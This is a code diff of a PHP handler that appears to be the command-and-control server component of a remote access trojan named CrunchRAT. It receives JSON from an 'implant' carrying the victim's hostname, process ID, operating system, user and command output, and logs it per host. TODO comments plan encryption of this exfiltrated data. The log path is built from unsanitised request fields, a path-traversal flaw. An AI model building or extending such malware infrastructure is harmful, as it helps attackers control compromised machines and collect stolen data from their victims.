@@ -1,25 +1,30 @@
 <?php
-    # JSON decodes implant POST data
-    $post_data = json_decode(file_get_contents("php://input"), true);
+    # Gets raw POST data
+    $raw_post_data = file_get_contents("php://input");
 
-    # TO DO: Add in checks for POST data, reject all requests that don't have the proper POST parameters
+    $json_decoded = json_decode($raw_post_data, true);
 
-    $hostname = $post_data["hostname"];
-    $process_id = $post_data["process_id"];
-    $os = $post_data["os"];
-    $current_user = $post_data["current_user"];
+    # RIGHT NOW THIS DATA IS NOT ENCRYPTED :(
 
-    $output = $post_data["output"];
-    $error = $post_data["error"];
+    # TO DO: Check for encryption key and decrypt like in "beacon.php"
 
-    # TO DO: Check if command output or error
+    $hostname = $json_decoded["hostname"];
+    $process_id = $json_decoded["process_id"];
+    $operating_system = $json_decoded["operating_system"];
+    $current_user = $json_decoded["current_user"];
+
+    $output = $json_decoded["output"];
+    $error = $json_decoded["error"];
+
+    # Builds log path
+    $log_path = "/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log";
 
     # If output
     if (isset($output) && !empty($output)) {
-        file_put_contents("/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log", "\nReceived output: \n" . $output, FILE_APPEND);
+        file_put_contents($log_path, "Received output: " . $output . "\n", FILE_APPEND);
     }
     # Else error
     else {
-        file_put_contents("/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log", "\nReceived error: \n" . $error, FILE_APPEND);
+        file_put_contents($log_path, "Received error: " . $error . "\n", FILE_APPEND);
     }
 ?>
